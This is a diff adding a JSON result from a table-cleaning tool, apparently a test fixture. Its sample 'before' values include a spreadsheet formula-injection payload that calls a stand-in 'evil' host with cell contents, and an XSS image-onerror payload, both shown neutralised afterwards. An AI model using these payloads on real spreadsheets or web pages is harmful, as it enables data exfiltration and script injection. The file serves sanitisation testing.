@@ -1,0 +1,156 @@
+{
+ "json": {
+  "change": {
+   "cells_changed": 80,
+   "columns_added": [],
+   "columns_removed": [],
+   "reordered": false,
+   "rows_after": 40,
+   "rows_before": 40,
+   "rows_changed": 40,
+   "sample": [
+    {
+     "cells": [
+      {
+       "after": "ALICE",
+       "before": "Alice",
+       "column": "Name"
+      },
+      {
+       "after": "HYPERLINKHTTPEVILA2X",
+       "before": "=HYPERLINK(\"http://evil/?\"&A2,\"x\")",
+       "column": "Notes"
+      }
+     ],
+     "row": 2
+    },
+    {
+     "cells": [
+      {
+       "after": "BOB",
+       "before": "Bob",
+       "column": "Name"
+      },
+      {
+       "after": "XY",
+       "before": "x|||y",
+       "column": "Notes"
+      }
+     ],
+     "row": 3
+    },
+    {
+     "cells": [
+      {
+       "after": "CAROL",
+       "before": "Carol",
+       "column": "Name"
+      },
+      {
+       "after": "IMG SRCX ONERRORALERT1",
+       "before": "<img src=x onerror=alert(1)>",
+       "column": "Notes"
+      }
+     ],
+     "row": 4
+    },
+    {
+     "cells": [
+      {
+       "after": "DAVE",
+       "before": "Dave",
+       "column": "Name"
+      },
+      {
+       "after": "CAFÉ",
+       "before": "café",
+       "column": "Notes"
+      }
+     ],
+     "row": 5
+    },
+    {
+     "cells": [
+      {
+       "after": "ALICE",
+       "before": "Alice",
+       "column": "Name"
+      },
+      {
+       "after": "HYPERLINKHTTPEVILA2X",
+       "before": "=HYPERLINK(\"http://evil/?\"&A2,\"x\")",
+       "column": "Notes"
+      }
+     ],
+     "row": 6
+    },
+    {
+     "cells": [
+      {
+       "after": "BOB",
+       "before": "Bob",
+       "column": "Name"
+      },
+      {
+       "after": "XY",
+       "before": "x|||y",
+       "column": "Notes"
+      }
+     ],
+     "row": 7
+    },
+    {
+     "cells": [
+      {
+       "after": "CAROL",
+       "before": "Carol",
+       "column": "Name"
+      },
+      {
+       "after": "IMG SRCX ONERRORALERT1",
+       "before": "<img src=x onerror=alert(1)>",
+       "column": "Notes"
+      }
+     ],
+     "row": 8
+    },
+    {
+     "cells": [
+      {
+       "after": "CAROL",
+       "before": "Carol",
+       "column": "Name"
+      },
+      {
+       "after": "IMG SRCX ONERRORALERT1",
+       "before": "<img src=x onerror=alert(1)>",
+       "column": "Notes"
+      }
+     ],
+     "row": 9
+    }
+   ]
+  },
+  "notes": [],
+  "success": true,
+  "summary": [
+   [
+    "Columns cleaned",
+    3
+   ],
+   [
+    "Cells changed",
+    80
+   ],
+   [
+    "Punctuation removed",
+    31
+   ],
+   [
+    "Case changed",
+    80
+   ]
+  ]
+ },
+ "status": 200
+}
